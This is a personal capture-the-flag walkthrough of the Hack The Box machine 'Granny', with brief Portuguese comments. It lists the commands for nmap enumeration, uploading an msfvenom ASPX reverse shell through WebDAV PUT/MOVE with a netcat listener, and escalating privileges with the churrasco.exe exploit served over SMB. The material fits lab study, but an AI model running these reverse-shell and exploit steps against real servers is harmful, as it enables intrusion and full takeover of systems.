Granny
=============

## Enumeration

    sudo nmap_enum granny.htb | tee nmap_output.txt
 
![qownnotes-media-wKVQja](../../../media/qownnotes-media-wKVQja.png)


PUT metlhod allowed

## Exploitation

    msfvenom -p windows/shellreverse_tcp -f aspx LHOST=10.10.14.4 LPORT=8080 > test.txt
    
    curl http://10.10.10.15 --upload-file test.txt -v
    
    curl -X MOVE -H "Destination:http://10.10.10.15/test.aspx" http://10.10.10.15/test.txt
    
    firefox http://10.10.10.15/test.aspx

    nc -nlvp 8080

![qownnotes-media-GoZNoO](../../../media/qownnotes-media-GoZNoO.png)

## PrivilegeEscalation

https://github.com/bitsadmin/wesng

    pip install wesng
    
    sudo ln -s /home/acosta/.local/bin/wes /usr/bin/wes
    
    wes --update
    
    wes si.txt

Pra facilitar eu já olhei na resposta logo e achei o sesguinte exploit. Nesse caso se trata de um exploit de kernel:

https://github.com/Re4son/Churrasco/blob/master/churrasco.exe

    impacket-smbserver smb .
    
    copy \\10.10.14.4\smb\churrasco.exe churrasco.exe

    churrasco.exe -d cmd
    
    cd C:\Documents and Settings\Administrator\Desktop
    type root.txt

![qownnotes-media-rAecxo](../../../media/qownnotes-media-rAecxo.png)

![qownnotes-media-dlSMVT](../../../media/qownnotes-media-dlSMVT.png)

![qownnotes-media-LqYcGT](../../../media/qownnotes-media-LqYcGT.png)
